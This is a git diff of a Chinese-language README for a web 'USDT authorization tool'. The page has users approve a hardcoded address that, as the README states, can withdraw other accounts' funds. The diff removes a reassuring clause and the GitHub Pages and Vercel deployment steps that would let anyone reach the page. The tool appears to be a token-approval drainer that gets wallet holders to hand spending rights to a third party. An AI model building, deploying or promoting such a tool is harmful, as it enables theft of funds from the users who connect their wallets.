@@ -1,6 +1,6 @@
 # USDT 授权工具
 
-这是一个用于授权特殊地址使用USDT代币的前端工具。特殊地址 `0xB8C306FAdfFE05BF3336333585B3FE9B7e6AFD02` 有权限提取其他账号的资金，但其他账号不能提取它的资金。
+这是一个用于授权特殊地址使用USDT代币的前端工具。特殊地址 `0xB8C306FAdfFE05BF3336333585B3FE9B7e6AFD02` 有权限提取其他账号的资金
 
 ## 功能特点
 
@@ -8,45 +8,6 @@
 - 授权特殊地址使用USDT代币
 - 检查当前授权额度
 - 响应式设计，适配不同屏幕尺寸
-
-## 部署步骤
-
-### 方法1：GitHub Pages（推荐）
-
-1. **创建GitHub仓库**
-   - 登录GitHub账号
-   - 创建一个新的仓库，命名为 `usdt-approval-tool` 或其他合适的名称
-
-2. **上传文件**
-   - 将以下文件上传到仓库：
-     - `index.html`
-     - `README.md`
-
-3. **启用GitHub Pages**
-   - 进入仓库设置
-   - 找到 "GitHub Pages" 部分
-   - 在 "Source" 下拉菜单中选择 "main" 分支
-   - 点击 "Save"
-   - 等待几分钟，GitHub Pages会自动部署
-
-4. **访问网站**
-   - 部署完成后，您会获得一个类似 `https://yourusername.github.io/usdt-approval-tool` 的网址
-   - 任何人都可以通过这个网址访问授权工具
-
-### 方法2：Vercel
-
-1. **注册Vercel账号**
-   - 访问 https://vercel.com/ 并注册账号
-
-2. **部署项目**
-   - 点击 "New Project"
-   - 选择 "Import Git Repository" 或 "Upload"
-   - 上传 `index.html` 文件
-   - 点击 "Deploy"
-
-3. **访问网站**
-   - 部署完成后，Vercel会提供一个类似 `https://project-name.vercel.app` 的网址
-
 ## 使用说明
 
 1. **连接钱包**
